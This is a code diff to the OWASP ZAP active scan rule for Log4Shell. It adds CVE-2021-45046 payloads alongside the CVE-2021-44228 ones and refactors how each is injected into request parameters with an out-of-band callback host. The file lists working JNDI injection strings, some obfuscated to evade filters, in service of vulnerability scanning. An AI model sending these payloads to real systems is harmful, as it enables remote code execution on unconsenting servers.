@@ -20,7 +20,9 @@
 package org.zaproxy.zap.extension.ascanrulesAlpha;
 
 import java.io.IOException;
+import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -39,7 +41,9 @@ public class Log4ShellScanRule extends AbstractAppParamPlugin {
 
     private static final Logger LOGGER = LogManager.getLogger(Log4ShellScanRule.class);
     private static final String PREFIX = "ascanalpha.log4shell.";
-    private static final String[] ATTACK_PATTERNS = {
+    private static final String PREFIX_CVE44228 = PREFIX + "cve44228.";
+    private static final String PREFIX_CVE45046 = PREFIX + "cve45046.";
+    private static final String[] ATTACK_PATTERNS_CVE44228 = {
         "${jndi:ldap://{0}/abc}",
         "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/abc}",
         "${${::-j}ndi:rmi://{0}/abc}",
@@ -51,7 +55,13 @@ public class Log4ShellScanRule extends AbstractAppParamPlugin {
         "${jndi:dns://{0}/abc}",
         "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/abc}"
     };
-    protected static final int ATTACK_PATTERN_COUNT = ATTACK_PATTERNS.length;
+    private static final String[] ATTACK_PATTERNS_CVE45046 = {
+        "${jndi:ldap://127.0.0.1#a.{0}:1389/abc}",
+        "${jndi:ldap://127.0.0.1#a.{0}/abc}",
+        "${jndi:ldap://localhost#a.{0}/abc}"
+    };
+    protected static final int ATTACK_PATTERN_COUNT =
+            ATTACK_PATTERNS_CVE44228.length + ATTACK_PATTERNS_CVE45046.length;
 
     @Override
     public int getId() {
@@ -70,7 +80,7 @@ public class Log4ShellScanRule extends AbstractAppParamPlugin {
 
     @Override
     public String getDescription() {
-        return Constant.messages.getString(PREFIX + "desc");
+        return "";
     }
 
     @Override
@@ -80,12 +90,12 @@ public class Log4ShellScanRule extends AbstractAppParamPlugin {
 
     @Override
     public String getSolution() {
-        return Constant.messages.getString(PREFIX + "soln");
+        return "";
     }
 
     @Override
     public String getReference() {
-        return Constant.messages.getString(PREFIX + "refs");
+        return "";
     }
 
     @Override
@@ -127,28 +137,45 @@ public class Log4ShellScanRule extends AbstractAppParamPlugin {
     @Override
     public void scan(HttpMessage msg, String param, String value) {
         try {
-            ExtensionOast extOast =
-                    Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
-            for (String attackPattern : ATTACK_PATTERNS) {
-                try {
-                    HttpMessage testMsg = getNewMsg();
-                    Alert alert =
-                            newAlert()
-                                    .setConfidence(Alert.CONFIDENCE_MEDIUM)
-                                    .setParam(param)
-                                    .setMessage(testMsg)
-                                    .build();
-                    String payload = extOast.registerAlertAndGetPayload(alert);
-                    String attack = attackPattern.replace("{0}", payload);
-                    alert.setAttack(attack);
-                    setParameter(testMsg, param, attack);
-                    sendAndReceive(testMsg);
-                } catch (IOException e) {
-                    LOGGER.warn(e.getMessage(), e);
-                }
-            }
+            scanWithPayloads(param, ATTACK_PATTERNS_CVE44228, PREFIX_CVE44228);
+            scanWithPayloads(param, ATTACK_PATTERNS_CVE45046, PREFIX_CVE45046);
         } catch (Exception e) {
             LOGGER.error(e.getMessage(), e);
         }
+    }
+
+    private void scanWithPayloads(String param, String[] attackPatterns, String alertPrefix)
+            throws Exception {
+        ExtensionOast extOast =
+                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
+        for (String attackPattern : attackPatterns) {
+            try {
+                HttpMessage testMsg = getNewMsg();
+                Alert alert =
+                        newCustomAlert(alertPrefix).setParam(param).setMessage(testMsg).build();
+                String payload = extOast.registerAlertAndGetPayload(alert);
+                String attack = attackPattern.replace("{0}", payload);
+                alert.setAttack(attack);
+                setParameter(testMsg, param, attack);
+                sendAndReceive(testMsg);
+            } catch (IOException e) {
+                LOGGER.warn(e.getMessage(), e);
+            }
+        }
+    }
+
+    private AlertBuilder newCustomAlert(String alertPrefix) {
+        return newAlert()
+                .setName(Constant.messages.getString(alertPrefix + "name"))
+                .setDescription(Constant.messages.getString(alertPrefix + "desc"))
+                .setSolution(Constant.messages.getString(alertPrefix + "soln"))
+                .setReference(Constant.messages.getString(alertPrefix + "refs"))
+                .setConfidence(Alert.CONFIDENCE_MEDIUM);
+    }
+
+    @Override
+    public List<Alert> getExampleAlerts() {
+        return Arrays.asList(
+                newCustomAlert(PREFIX_CVE44228).build(), newCustomAlert(PREFIX_CVE45046).build());
     }
 }
